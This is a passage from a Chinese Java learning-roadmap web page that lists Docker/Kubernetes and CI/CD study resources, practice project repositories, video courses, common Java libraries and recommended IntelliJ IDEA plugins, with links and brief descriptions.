Swarm</li><li>多阶段构建</li></ul></li><li>🌘 K8S（Kubernetes）<ul><li>K8S 架构</li><li>工作负载<ul><li>资源类型</li><li>Pod</li><li>Pod 生命周期</li><li>Pod 安全策略</li></ul></li><li>K8S 组件</li><li>K8S 对象</li><li>部署应用</li><li>服务<ul><li>Ingress</li></ul></li><li>Kubectl 命令行</li><li>集群管理</li></ul></li><li>相关技术：Apache Mesos、Mesosphere</li></ul><h4 id="学习建议-20"><a href="#学习建议-20" class="headerlink" title="学习建议"></a>学习建议</h4><p>业务上云是趋势，但是对于开发同学来说，会用 Docker &#x2F; K8S 部署项目和服务就行。实际工作中，企业一般都有现成的平台直接用，面试考察的也不多，不用花太多时间。</p><h4 id="经典面试题-15"><a href="#经典面试题-15" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>什么是容器？</li><li>使用  Docker 有哪些好处？</li><li>如何快速启动多个 Docker 节点？</li></ol><h4 id="资源-20"><a href="#资源-20" class="headerlink" title="资源"></a>资源</h4><ul><li><p>视频</p><ul><li>⭐【狂神说】Docker 最新超详细版教程通俗易懂：<a href="https://www.bilibili.com/video/BV1og4y1q7M4">https://www.bilibili.com/video/BV1og4y1q7M4</a></li><li>K8S 视频教程：<a href="https://www.bilibili.com/video/BV1K5411N7j8">https://www.bilibili.com/video/BV1K5411N7j8</a></li></ul></li><li><p>书籍</p><ul><li>《深入浅出 Docker》：<a href="https://www.zhihu.com/pub/reader/119632192">https://www.zhihu.com/pub/reader/119632192</a></li></ul></li><li><p>文档</p><ul><li>Docker — 从入门到实践：<a href="https://vuepress.mirror.docker-practice.com/">https://vuepress.mirror.docker-practice.com/</a></li><li>菜鸟教程 Docker：<a href="https://www.runoob.com/docker/docker-tutorial.html">https://www.runoob.com/docker/docker-tutorial.html</a></li><li>国外 Docker 官方文档：<a href="https://docs.docker.com/get-started/">https://docs.docker.com/get-started/</a></li></ul></li><li><p>网站</p><ul><li>Docker 中文社区：<a href="https://www.docker.org.cn/">https://www.docker.org.cn/</a> （强烈推荐，有很多 Docker 技术文章和学习笔记）</li><li>Docker Blog：<a href="https://www.docker.com/blog/">https://www.docker.com/blog/</a> （国外 Docker 技术博客）</li></ul></li><li><p>镜像源</p><ul><li>Docker Hub：<a href="https://hub.docker.com/">https://hub.docker.com</a></li><li>腾讯软件源：<a href="http://mirrors.tencent.com/#/index">http://mirrors.tencent.com/#/index</a></li><li>阿里云 Docker 仓库：<a href="https://cr.console.aliyun.com/">https://cr.console.aliyun.com/</a></li></ul></li></ul><h3 id="🌗-CI-x2F-CD（3-天）"><a href="#🌗-CI-x2F-CD（3-天）" class="headerlink" title="🌗 CI &#x2F; CD（3 天）"></a>🌗 CI &#x2F; CD（3 天）</h3><p>持续集成 &#x2F; 持续交付，贯穿整个研发到项目上线的过程，提高效率。</p><p>大公司一般都有自己的 CI &#x2F; CD 平台。</p><h4 id="知识-20"><a href="#知识-20" class="headerlink" title="知识"></a>知识</h4><ul><li>什么是 CI &#x2F; CD</li><li>CI &#x2F; CD 有什么好处</li><li>使用任一 CI &#x2F; CD 平台</li><li>相关技术：Jenkins、GitLab、微信云托管</li></ul><h4 id="学习建议-21"><a href="#学习建议-21" class="headerlink" title="学习建议"></a>学习建议</h4><p>了解它是什么，并且实战使用任一 CI &#x2F; CD 平台，感受它和传统开发运维到底有什么不同，就足够了。其实很简单，不要花太多时间。</p><p>真正要自己去搭建的时候，跟着官方文档来就行。</p><h4 id="资源-21"><a href="#资源-21" class="headerlink" title="资源"></a>资源</h4><ul><li><p>视频</p><ul><li>⭐【狂神说】CI&#x2F;CD到底是什么？十分钟理解企业级DevOps：<a href="https://www.bilibili.com/video/BV1zf4y127vu">https://www.bilibili.com/video/BV1zf4y127vu</a> （讲的非常棒！带你快速理解 CI &#x2F; CD 的作用和部分原理）</li><li>尚硅谷 - Jenkins 持续集成工具教程：<a href="https://www.bilibili.com/video/BV1GW411w7pn">https://www.bilibili.com/video/BV1GW411w7pn</a> （实在要用到 Jenkins 再去学）</li></ul></li><li><p>文档</p><ul><li>Jenkins 官方文档：<a href="https://www.jenkins.io/zh/">https://www.jenkins.io/zh/</a> （有很多案例，要用的时候查一下就行了）</li></ul></li><li><p>实战平台</p><ul><li>⭐ 微信云托管：<a href="https://cloud.weixin.qq.com/cloudrun">https://cloud.weixin.qq.com/cloudrun</a> （直播演示过，鱼皮后面会给大家出视频教程）</li><li>前端托管 Webify：<a href="https://cloud.tencent.com/product/webify">https://cloud.tencent.com/product/webify</a> （鱼皮给大家出过视频教程的 <a href="https://www.bilibili.com/video/BV11V411p7vf/%EF%BC%89">https://www.bilibili.com/video/BV11V411p7vf/）</a></li></ul></li></ul><h3 id="练手项目-2"><a href="#练手项目-2" class="headerlink" title="练手项目"></a>练手项目</h3><blockquote><p>更多请见本路线阶段 5：[项目源码（50 套）](###项目源码（50 套）) 。</p></blockquote><ul><li><p>mall-learning：<a href="https://github.com/macrozheng/mall-learningmall">https://github.com/macrozheng/mall-learningmall</a> （学习教程，架构、业务、技术要点全方位解析）</p></li><li><p>miaosha：<a href="https://github.com/qiurunze123/miaosha">https://github.com/qiurunze123/miaosha</a> （秒杀系统设计与实现）</p></li><li><p>Mall：<a href="https://github.com/macrozheng/mall">https://github.com/macrozheng/mall</a> （包括前台商城系统及后台管理系统，基于 SpringBoot+MyBatis 实现）</p></li><li><p>Spring-Cloud-Admin：<a href="https://github.com/wxiaoqi/Spring-Cloud-AdminCloud-Admin">https://github.com/wxiaoqi/Spring-Cloud-AdminCloud-Admin</a> （基于 Spring Cloud 微服务化开发平台，具有统一授权、认证的后台管理系统）</p></li><li><p>paascloud-master：<a href="https://github.com/paascloud/paascloud-master">https://github.com/paascloud/paascloud-master</a> （基于 spring cloud + vue + oAuth2.0，前后端分离商城系统）</p></li><li><p>mall-swarm：<a href="https://github.com/macrozheng/mall-swarm">https://github.com/macrozheng/mall-swarm</a> （一套微服务商城系统，采用了 Spring Cloud Greenwich、Spring Boot 2、MyBatis、Docker、Elasticsearch 等核心技术，同时提供了基于 Vue 的管理后台方便快速搭建系统）</p></li><li><p>SecKill：<a href="https://github.com/hfbin/Seckill">https://github.com/hfbin/Seckill</a> （基于 SpringBoot+Mybatis+Redis+RabbitMQ 秒杀系统）</p></li><li><p>jeecg-boot：<a href="https://github.com/zhangdaiscott/jeecg-boot">https://github.com/zhangdaiscott/jeecg-boot</a> （低代码开发平台）</p></li><li><p>PassJava-Platform：<a href="https://github.com/Jackson0714/PassJava-Platform">https://github.com/Jackson0714/PassJava-Platform</a> （一款面试刷题的 Spring Cloud 开源系统）</p></li></ul><h3 id="尾声-3"><a href="#尾声-3" class="headerlink" title="尾声"></a>尾声</h3><p>看到这里，相信你已经感叹：编程语言一辈子学不完了！</p><p>但是，不用担心，通过对这么多知识点的学习，相信你已经有了一定的积累，也不知不觉地锻炼了自主学习能力、资源检索能力、代码阅读能力、问题解决能力，之后的学习会越来越轻松。</p><p>接下来，可以试着用你学到的技术来解决实际的问题，自主从 0 开始做一些项目，保持编程手感。</p><h2 id="阶段-5：项目实战"><a href="#阶段-5：项目实战" class="headerlink" title="阶段 5：项目实战"></a>阶段 5：项目实战</h2><h3 id="目标-4"><a href="#目标-4" class="headerlink" title="目标"></a>目标</h3><p>综合所学技术从 0 到 1 开发和上线一个全面、有特色的、可以写进简历的个人项目。</p><h3 id="学习建议-22"><a href="#学习建议-22" class="headerlink" title="学习建议"></a>学习建议</h3><p>其实在之前的框架学习视频中应该就做过几个项目了，但相对不够完整和体系化。</p><p>有想法的同学可以做任何自己想做的项目，推荐参加一些作品类竞赛，练手、拿奖、收获项目经历一举三得。</p><p>暂时没想法的朋友，建议先跟着专门带做项目的视频教程做 1 - 2 套 Java 完整项目，一定要从 0 到 1 自己手写！</p><p>有能力的朋友也可以试着用 GitHub 上的源码来学习啦~</p><p>做一个完整的项目的确很不容易，建议大家根据自己的 <strong>时间、兴趣</strong> 选择 <strong>较新的</strong>、<strong>有配套源码的</strong> 教程，保持耐心。</p><p>如何选择编程学习资源，可以看下我的原创文章：<a href="https://mp.weixin.qq.com/s/mlMql9RJCd7THt6rpGb8UA">https://mp.weixin.qq.com/s/mlMql9RJCd7THt6rpGb8UA</a></p><p>下面推荐一些优质的、较新的项目实战视频教程 + 50 套项目源码。</p><h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><ul><li><p>尚硅谷 - 谷粒学院 - 微服务 + 全栈 - 在线教育实战项目：<a href="https://www.bilibili.com/video/BV1dQ4y1A75e">https://www.bilibili.com/video/BV1dQ4y1A75e</a> （全栈项目，前后端讲得都很全面）</p></li><li><p>尚硅谷 - 尚筹网 - Java项目实战开发教程 - SSM 框架 + 微服务架构：<a href="https://www.bilibili.com/video/BV1bE411T7oZ%EF%BC%88500">https://www.bilibili.com/video/BV1bE411T7oZ（500</a> 多集，包含完整的用户权限管理，功能丰富、讲得很细致全面）</p></li><li><p>黑马 - 24 小时搞定 Java 毕设电商项目：<a href="https://www.bilibili.com/video/BV13f4y1r7fS">https://www.bilibili.com/video/BV13f4y1r7fS</a></p></li><li><p>黑马程序员 Java 项目《传智健康》，超完整的企业级医疗行业项目：<a href="https://www.bilibili.com/video/BV1Bo4y117zV">https://www.bilibili.com/video/BV1Bo4y117zV</a></p></li><li><p>黑马程序员 Java 项目《万信金融》企业级开发实战，互联网金融行业解决方案：<a href="https://www.bilibili.com/video/BV1Ub4y1f7rk">https://www.bilibili.com/video/BV1Ub4y1f7rk</a></p></li><li><p>黑马程序员 Java 项目 SaaS 移动办公完整版《iHRM 人力资源管理系统》，跨行业 SaaS 办公整合性解决方案：<a href="https://www.bilibili.com/video/BV18A411L7UX">https://www.bilibili.com/video/BV18A411L7UX</a></p></li><li><p>黑马程序员 Java 大型分布式微服务闪聚支付项目，Java 移动支付全生态系统：<a href="https://www.bilibili.com/video/BV17v411V79c">https://www.bilibili.com/video/BV17v411V79c</a></p></li><li><p>黑马程序员 Java 项目《好客租房》：<a href="https://www.bilibili.com/video/BV1sZ4y1F7PD">https://www.bilibili.com/video/BV1sZ4y1F7PD</a></p></li></ul><h3 id="常用类库"><a href="#常用类库" class="headerlink" title="常用类库"></a>常用类库</h3><h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><ul><li>Guava：谷歌开发的 Java 工具库（<a href="https://github.com/google/guava%EF%BC%89">https://github.com/google/guava）</a></li><li>Apache Commons：各类工具库，比如 commons-lang、commons-io、commons-collections 等（<a href="https://github.com/apache/commons-lang%EF%BC%89">https://github.com/apache/commons-lang）</a></li><li>Hutool：Java 工具集库（<a href="https://github.com/looly/hutool%EF%BC%89">https://github.com/looly/hutool）</a></li><li>Lombok：Java 增强库（<a href="https://github.com/projectlombok/lombok%EF%BC%89">https://github.com/projectlombok/lombok）</a></li><li>Apache HttpComponents Client：HTTP 客户端库（<a href="https://github.com/apache/httpcomponents-client%EF%BC%89">https://github.com/apache/httpcomponents-client）</a></li><li>OkHttp：适用于 JVM、Android 等平台的 Http 客户端（<a href="https://github.com/square/okhttp%EF%BC%89">https://github.com/square/okhttp）</a></li><li>Gson：谷歌的 JSON 处理库（<a href="https://github.com/google/gson%EF%BC%89">https://github.com/google/gson）</a></li><li>Jcommander：Java 命令行参数解析框架（<a href="https://github.com/cbeust/jcommander%EF%BC%89">https://github.com/cbeust/jcommander）</a></li><li>Apache PDFBox：PDF 操作库（<a href="https://github.com/apache/pdfbox%EF%BC%89">https://github.com/apache/pdfbox）</a></li><li>EasyExcel：阿里的 Excel 处理库（<a href="https://github.com/alibaba/easyexcel%EF%BC%89">https://github.com/alibaba/easyexcel）</a></li><li>Apache POI：表格文件处理库（<a href="https://github.com/apache/poi%EF%BC%89">https://github.com/apache/poi）</a></li></ul><h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><ul><li>JUnit：Java 测试框架（<a href="https://github.com/junit-team/junit4%EF%BC%89">https://github.com/junit-team/junit4）</a></li><li>Mockito：Java 单元测试 Mock 框架（<a href="https://github.com/mockito/mockito%EF%BC%89">https://github.com/mockito/mockito）</a></li><li>Selenium：浏览器自动化框架（<a href="https://github.com/SeleniumHQ/selenium%EF%BC%89">https://github.com/SeleniumHQ/selenium）</a></li><li>htmlunit：Java 模拟浏览器（<a href="https://github.com/HtmlUnit/htmlunit%EF%BC%89">https://github.com/HtmlUnit/htmlunit）</a></li><li>TestNG：Java 测试框架（<a href="https://github.com/cbeust/testng%EF%BC%89">https://github.com/cbeust/testng）</a></li><li>Jacoco：Java 代码覆盖度库（<a href="https://github.com/jacoco/jacoco%EF%BC%89">https://github.com/jacoco/jacoco）</a></li></ul><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><ul><li>cglib：字节码生成库（<a href="https://github.com/cglib/cglib%EF%BC%89">https://github.com/cglib/cglib）</a></li><li>Arthas：Java 诊断工具（<a href="https://github.com/alibaba/arthas%EF%BC%89">https://github.com/alibaba/arthas）</a></li><li>config：针对 JVM 的配置库（<a href="https://github.com/lightbend/config%EF%BC%89">https://github.com/lightbend/config）</a></li><li>Quasar：Java 纤程库（<a href="https://github.com/puniverse/quasar%EF%BC%89">https://github.com/puniverse/quasar）</a></li><li>drools：Java 规则引擎（<a href="https://github.com/kiegroup/drools%EF%BC%89">https://github.com/kiegroup/drools）</a></li><li>Caffeine：Java 高性能缓存库（<a href="https://github.com/ben-manes/caffeine%EF%BC%89">https://github.com/ben-manes/caffeine）</a></li><li>Disruptor：高性能线程间消息传递库（<a href="https://github.com/LMAX-Exchange/disruptor%EF%BC%89">https://github.com/LMAX-Exchange/disruptor）</a></li><li>Knife4j：Swagger 文档增强（<a href="https://doc.xiaominfo.com/%EF%BC%89">https://doc.xiaominfo.com/）</a></li><li>Thumbnailator：Java 缩略图生成库（<a href="https://github.com/coobird/thumbnailator%EF%BC%89">https://github.com/coobird/thumbnailator）</a></li><li>Logback：Java 日志库（<a href="https://github.com/qos-ch/logback%EF%BC%89">https://github.com/qos-ch/logback）</a></li><li>Apache Camel：消息传输集成框架（<a href="https://github.com/apache/camel%EF%BC%89">https://github.com/apache/camel）</a></li><li>Quartz：定时任务调度库（<a href="https://github.com/quartz-scheduler/quartz%EF%BC%89">https://github.com/quartz-scheduler/quartz）</a></li><li>Apache Mahout：机器学习库（<a href="https://github.com/apache/mahout%EF%BC%89">https://github.com/apache/mahout）</a></li><li>Apache OpenNLP：NLP 工具库（<a href="https://github.com/apache/opennlp%EF%BC%89">https://github.com/apache/opennlp）</a></li><li>RxJava：JVM 反应式编程框架（<a href="https://github.com/ReactiveX/RxJava%EF%BC%89">https://github.com/ReactiveX/RxJava）</a></li><li>JProfiler：性能分析库（<a href="https://www.ej-technologies.com/products/jprofiler/overview.html%EF%BC%89">https://www.ej-technologies.com/products/jprofiler/overview.html）</a></li><li>jsoup：HTML 文档解析库（<a href="https://jsoup.org/%EF%BC%89">https://jsoup.org/）</a></li><li>webmagic：Java 爬虫框架（<a href="https://github.com/code4craft/webmagic/%EF%BC%89">https://github.com/code4craft/webmagic/）</a></li></ul><h3 id="IDEA-插件"><a href="#IDEA-插件" class="headerlink" title="IDEA 插件"></a>IDEA 插件</h3><p>综合实用性、易用性、流行度、维护频率，精选了以下插件，简单分类为天地二品。</p><h4 id="精选地品插件"><a href="#精选地品插件" class="headerlink" title="精选地品插件"></a>精选地品插件</h4><p>简单好用、增强功能</p><ul><li><p>Background Image Plus +</p><ul><li>描述：给编辑器设置背景图片（小姐姐图片）</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/11247-background-image-plus-">https://plugins.jetbrains.com/plugin/11247-background-image-plus-</a></li></ul></li><li><p>Chinese Language Pack</p><ul><li>描述：中文支持</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/13710-chinese-simplified-language-pack----">https://plugins.jetbrains.com/plugin/13710-chinese-simplified-language-pack----</a></li></ul></li><li><p>Translation</p><ul><li>描述：翻译插件，鼠标选中文本，点击右键即可自动翻译成多国语言。</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8579-translation/">https://plugins.jetbrains.com/plugin/8579-translation/</a></li></ul></li><li><p>Key Promoter X</p><ul><li>描述：快捷键提示插件。当你执行鼠标操作时，如果该操作可被快捷键代替，会给出提示，帮助你自然形成使用快捷键的习惯，告别死记硬背。</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/9792-key-promoter-x/">https://plugins.jetbrains.com/plugin/9792-key-promoter-x/</a></li></ul></li><li><p>Rainbow Brackets</p><ul><li>描述：给括号添加彩虹色，使开发者通过颜色区分括号嵌套层级，便于阅读</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/10080-rainbow-brackets/">https://plugins.jetbrains.com/plugin/10080-rainbow-brackets/</a></li></ul></li><li><p>CodeGlance</p><ul><li>描述：在编辑器右侧生成代码小地图，可以拖拽小地图光标快速定位代码，阅读行数很多的代码文件时非常实用。</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7275-codeglance/">https://plugins.jetbrains.com/plugin/7275-codeglance/</a></li></ul></li><li><p>WakaTime</p><ul><li>描述：代码统计和跟踪插件</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7425-wakatime">https://plugins.jetbrains.com/plugin/7425-wakatime</a></li></ul></li><li><p>Statistic</p><ul><li>描述：代码统计</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/4509-statistic">https://plugins.jetbrains.com/plugin/4509-statistic</a></li></ul></li></ul><h4 id="精选天品插件"><a href="#精选天品插件" class="headerlink" title="精选天品插件"></a>精选天品插件</h4><p>提高开发效率和代码质量</p><ul><li><p>String Manipulation</p><ul><li>描述：字符串快捷处理</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/2162-string-manipulation">https://plugins.jetbrains.com/plugin/2162-string-manipulation</a></li></ul></li><li><p>Tabnine AI Code Completion</p><ul><li>描述：使用 AI 去自动提示和补全代码，比 IDEA 自带的代码补全更加智能化</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/12798-tabnine-ai-code-completion-js-java-python-ts-rust-go-php--more">https://plugins.jetbrains.com/plugin/12798-tabnine-ai-code-completion-js-java-python-ts-rust-go-php--more</a></li></ul></li><li><p>GsonFormatPlus</p><ul><li>描述：根据 json 生成对象</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/14949-gsonformatplus">https://plugins.jetbrains.com/plugin/14949-gsonformatplus</a></li></ul></li><li><p>JUnitGenerator V2.0</p><ul><li>描述：自动生成单元测试</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/3064-junitgenerator-v2-0">https://plugins.jetbrains.com/plugin/3064-junitgenerator-v2-0</a></li></ul></li><li><p>RestfulTool</p><ul><li>描述：辅助 web 开发的工具集</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/14280-restfultool">https://plugins.jetbrains.com/plugin/14280-restfultool</a></li></ul></li><li><p>SequenceDiagram</p><ul><li>描述：自动生成方法调用时序图</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8286-sequencediagram">https://plugins.jetbrains.com/plugin/8286-sequencediagram</a></li></ul></li><li><p>CheckStyle-IDEA</p><ul><li>描述：自动检查 Java 代码规范</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/1065-checkstyle-idea">https://plugins.jetbrains.com/plugin/1065-checkstyle-idea</a></li></ul></li><li><p>Alibaba Java Coding Guidelines</p><ul><li>描述：代码规范检查插件</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/10046-alibaba-java-coding-guidelines">https://plugins.jetbrains.com/plugin/10046-alibaba-java-coding-guidelines</a></li></ul></li><li><p>SonarLint</p><ul><li>描述：帮助你发现和修复代码的错误和漏洞</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7973-sonarlint">https://plugins.jetbrains.com/plugin/7973-sonarlint</a></li></ul></li><li><p>MybatisX</p><ul><li>描述：MyBatis 增强插件，支持自动生成 entity、mapper、service 等常用操作的代码，优化体验</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/10119-mybatisx">https://plugins.jetbrains.com/plugin/10119-mybatisx</a></li></ul></li></ul><h4 id="美化类"><a href="#美化类" class="headerlink" title="美化类"></a>美化类</h4><ul><li><p>Extra Icons</p><ul><li>描述：图标美化插件，支持更多文件类型</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/11058-extra-icons">https://plugins.jetbrains.com/plugin/11058-extra-icons</a></li></ul></li><li><p>Chinese Language Pack</p><ul><li>描述：中文支持</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/13710-chinese-simplified-language-pack----">https://plugins.jetbrains.com/plugin/13710-chinese-simplified-language-pack----</a></li></ul></li><li><p>Grep Console</p><ul><li>描述：自定义设置控制台输出颜色</li><li>官网：<a href="https://plugins.jetbrains.com/idea/plugin/7125-grep-console">https://plugins.jetbrains.com/idea/plugin/7125-grep-console</a></li></ul></li><li><p>Material Theme UI</p><ul><li>描述：美观的主题</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8006-material-theme-ui">https://plugins.jetbrains.com/plugin/8006-material-theme-ui</a></li></ul></li><li><p>Nyan Progress Bar</p><ul><li>描述：进度条美化</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8575-nyan-progress-bar">https://plugins.jetbrains.com/plugin/8575-nyan-progress-bar</a></li></ul></li><li><p>activate-power-mode</p><ul><li>描述：打字特效</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8330-activate-power-mode">https://plugins.jetbrains.com/plugin/8330-activate-power-mode</a></li></ul></li><li><p>Power Mode II</p><ul><li>描述：打字特效插件升级版</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8251-power-mode-ii">https://plugins.jetbrains.com/plugin/8251-power-mode-ii</a></li></ul></li><li><p>Rainbow Brackets</p><ul><li>描述：给括号添加彩虹色，使开发者通过颜色区分括号嵌套层级，便于阅读</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/10080-rainbow-brackets/">https://plugins.jetbrains.com/plugin/10080-rainbow-brackets/</a></li></ul></li><li><p>Background Image Plus +</p><ul><li>描述：给编辑器设置背景图片</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/11247-background-image-plus-">https://plugins.jetbrains.com/plugin/11247-background-image-plus-</a></li></ul></li></ul><h4 id="代码生成类"><a href="#代码生成类" class="headerlink" title="代码生成类"></a>代码生成类</h4><ul><li><p>Codota AI Autocomplete for Java and JavaScript</p><ul><li>描述：使用 AI 去自动提示和补全代码，比 IDEA 自带的代码补全更加智能化</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7638-codota-ai-autocomplete-for-java-and-javascript">https://plugins.jetbrains.com/plugin/7638-codota-ai-autocomplete-for-java-and-javascript</a></li></ul></li><li><p>Tabnine AI Code Completion</p><ul><li>描述：使用 AI 来自动提示和补全代码，比 IDEA 自带的代码补全更加智能化</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/12798-tabnine-ai-code-completion-js-java-python-ts-rust-go-php--more">https://plugins.jetbrains.com/plugin/12798-tabnine-ai-code-completion-js-java-python-ts-rust-go-php--more</a></li></ul></li><li><p>UUID Generator</p><ul><li>描述：生成随机的 UUID</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8320-uuid-generator">https://plugins.jetbrains.com/plugin/8320-uuid-generator</a></li></ul></li><li><p>Randomness</p><ul><li>描述：生成随机值</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/9836-randomness">https://plugins.jetbrains.com/plugin/9836-randomness</a></li></ul></li><li><p>.ignore</p><ul><li>描述：生成不同语言的版本控制忽略文件</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7495--ignore">https://plugins.jetbrains.com/plugin/7495--ignore</a></li></ul></li><li><p>Auto filling Java call arguments</p><ul><li>描述：通过快捷键自动补全函数的调用参数</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8638-auto-filling-java-call-arguments/">https://plugins.jetbrains.com/plugin/8638-auto-filling-java-call-arguments/</a></li></ul></li><li><p>GenerateAllSetter</p><ul><li>描述：快速生成调用对象 setter 方法的代码</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/9360-generateallsetter">https://plugins.jetbrains.com/plugin/9360-generateallsetter</a></li></ul></li><li><p>GenerateSerialVersionUID</p><ul><li>描述：一键为实现 Serializable 接口的类生成 SerialVersionUID</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/185-generateserialversionuid/">https://plugins.jetbrains.com/plugin/185-generateserialversionuid/</a></li></ul></li><li><p>GsonFormatPlus</p><ul><li>描述：根据 json 生成对象</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/14949-gsonformatplus">https://plugins.jetbrains.com/plugin/14949-gsonformatplus</a></li></ul></li><li><p>Lombok</p><ul><li><p>描述：配合 Lombok 依赖及注解使用，能够大大减少 Java 对象的代码量。IDEA 已自带，无需安装。</p></li><li><p>官网：<a href="https://plugins.jetbrains.com/plugin/6317-lombok/">https://plugins.jetbrains.com/plugin/6317-lombok/</a></p></li></ul></li><li><p>Easy Code</p><ul><li>描述：根据数据库表生成 Java entity、dao、mapper、service、controller 等代码</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/10954-easy-code">https://plugins.jetbrains.com/plugin/10954-easy-code</a></li></ul></li><li><p>Easy Javadoc</p><ul><li>描述：快速生成 Javadoc 文档</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/12977-easy-javadoc">https://plugins.jetbrains.com/plugin/12977-easy-javadoc</a></li></ul></li><li><p>JavaDoc</p><ul><li>描述：生成 Javadoc 文档</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7157-javadoc">https://plugins.jetbrains.com/plugin/7157-javadoc</a></li></ul></li><li><p>Json2Pojo</p><ul><li>描述：根据 JSON 生成 POJO，根据 POJO 生成 JSON</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8533-json2pojo">https://plugins.jetbrains.com/plugin/8533-json2pojo</a></li></ul></li><li><p>JUnitGenerator V2.0</p><ul><li>描述：自动生成单元测试</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/3064-junitgenerator-v2-0">https://plugins.jetbrains.com/plugin/3064-junitgenerator-v2-0</a></li></ul></li><li><p>Jindent - Source Code Formatter</p><ul><li>描述：根据自定义模板来生成 javadoc 注释</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8309-jindent--source-code-formatter">https://plugins.jetbrains.com/plugin/8309-jindent--source-code-formatter</a></li></ul></li><li><p>MybatisX</p><ul><li>描述：MyBatis 增强插件，支持自动生成 entity、mapper、service 等常用操作的代码，优化体验</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/10119-mybatisx">https://plugins.jetbrains.com/plugin/10119-mybatisx</a></li></ul></li><li><p>MyBatisCodeHelperPro</p><ul><li>描述：MyBatis 增强插件，支持自动生成 entity、mapper、service 等常用操作的代码（收费）</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/9837-mybatiscodehelperpro">https://plugins.jetbrains.com/plugin/9837-mybatiscodehelperpro</a></li></ul></li></ul><h4 id="功能提效类"><a href="#功能提效类" class="headerlink" title="功能提效类"></a>功能提效类</h4><h5 id="源码阅读"><a href="#源码阅读" class="headerlink" title="源码阅读"></a>源码阅读</h5><ul><li>Call Graph<ul><li>描述：生成调用关系图，便于查看源码</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/12304-call-graph">https://plugins.jetbrains.com/plugin/12304-call-graph</a></li></ul></li><li>Jump to Line<ul><li>描述：支持跳转到任意行进行调试</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/14877-jump-to-line">https://plugins.jetbrains.com/plugin/14877-jump-to-line</a></li></ul></li><li>SequenceDiagram<ul><li>描述：自动生成方法调用时序图</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8286-sequencediagram">https://plugins.jetbrains.com/plugin/8286-sequencediagram</a></li></ul></li><li>jclasslib Bytecode Viewer<ul><li>描述：字节码查看器</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/9248-jclasslib-bytecode-viewer">https://plugins.jetbrains.com/plugin/9248-jclasslib-bytecode-viewer</a></li></ul></li><li>BrowseWordAtCaret<ul><li>描述： 快速在相同单词间进行跳转</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/201-browsewordatcaret">https://plugins.jetbrains.com/plugin/201-browsewordatcaret</a></li></ul></li><li>CodeGlance<ul><li>描述：在编辑器右侧生成代码小地图，可以拖拽小地图光标快速定位代码，阅读行数很多的代码文件时非常实用。</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7275-codeglance/">https://plugins.jetbrains.com/plugin/7275-codeglance/</a></li></ul></li></ul><h5 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h5><ul><li>CheckStyle-IDEA<ul><li>描述：自动检查 Java 代码规范</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/1065-checkstyle-idea">https://plugins.jetbrains.com/plugin/1065-checkstyle-idea</a></li></ul></li><li>Alibaba Java Coding Guidelines<ul><li>描述：代码规范检查插件</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/10046-alibaba-java-coding-guidelines">https://plugins.jetbrains.com/plugin/10046-alibaba-java-coding-guidelines</a></li></ul></li><li>SonarLint<ul><li>描述：帮助你发现和修复代码的错误和漏洞</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7973-sonarlint">https://plugins.jetbrains.com/plugin/7973-sonarlint</a></li></ul></li><li>FindBugs-IDEA<ul><li>描述：帮你找出代码中潜藏的 Bug</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/3847-findbugs-idea">https://plugins.jetbrains.com/plugin/3847-findbugs-idea</a></li></ul></li><li>MetricsReloaded<ul><li>描述：代码复杂度分析</li><li>官网：<a 